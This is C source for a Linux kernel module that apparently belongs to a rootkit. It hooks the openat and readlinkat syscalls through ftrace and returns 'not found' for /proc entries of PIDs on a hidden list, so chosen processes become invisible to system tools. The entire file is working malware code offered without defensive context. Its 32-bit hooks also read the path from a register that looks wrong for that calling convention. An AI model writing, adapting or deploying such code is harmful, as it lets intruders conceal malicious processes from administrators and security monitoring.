#include "../include/core.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/hidden_pids.h"

#define PATH_BUF_SIZE 256

static asmlinkage long (*orig_openat)(const struct pt_regs *);
static asmlinkage long (*orig_openat32)(const struct pt_regs *);
static asmlinkage long (*orig_readlinkat)(const struct pt_regs *);
static asmlinkage long (*orig_readlinkat32)(const struct pt_regs *);

static notrace bool is_hidden_proc_path(const char __user *pathname)
{
    char buf[PATH_BUF_SIZE];
    long copied;
    char pid_buf[16] = {0};
    int i = 0;

    if (!pathname)
        return false;

    memset(buf, 0, PATH_BUF_SIZE);
    copied = strncpy_from_user(buf, pathname, PATH_BUF_SIZE - 1);
    if (copied < 0)
        return false;

    buf[PATH_BUF_SIZE - 1] = '\0';

    if (strncmp(buf, "/proc/", 6) != 0)
        return false;

    const char *after = buf + 6;
    while (i < (int)sizeof(pid_buf) - 1 &&
           after[i] &&
           after[i] != '/' &&
           after[i] >= '0' && after[i] <= '9') {
        pid_buf[i] = after[i];
        i++;
    }
    pid_buf[i] = '\0';

    if (i == 0)
        return false;

    return is_hidden_pid(pid_buf);
}

static notrace asmlinkage long hook_openat(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)regs->si;
    if (is_hidden_proc_path(pathname))
        return -ENOENT;
    return orig_openat(regs);
}

static notrace asmlinkage long hook_openat32(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)regs->si;
    if (is_hidden_proc_path(pathname))
        return -ENOENT;
    return orig_openat32(regs);
}

static notrace asmlinkage long hook_readlinkat(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)regs->si;
    if (is_hidden_proc_path(pathname))
        return -ENOENT;
    return orig_readlinkat(regs);
}

static notrace asmlinkage long hook_readlinkat32(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)regs->si;
    if (is_hidden_proc_path(pathname))
        return -ENOENT;
    return orig_readlinkat32(regs);
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_openat",     hook_openat,     &orig_openat),
    HOOK("__ia32_sys_openat",    hook_openat32,   &orig_openat32),
    HOOK("__x64_sys_readlinkat", hook_readlinkat, &orig_readlinkat),
    HOOK("__ia32_sys_readlinkat",hook_readlinkat32,&orig_readlinkat32),
};

notrace int hiding_open_init(void)
{
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

notrace void hiding_open_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

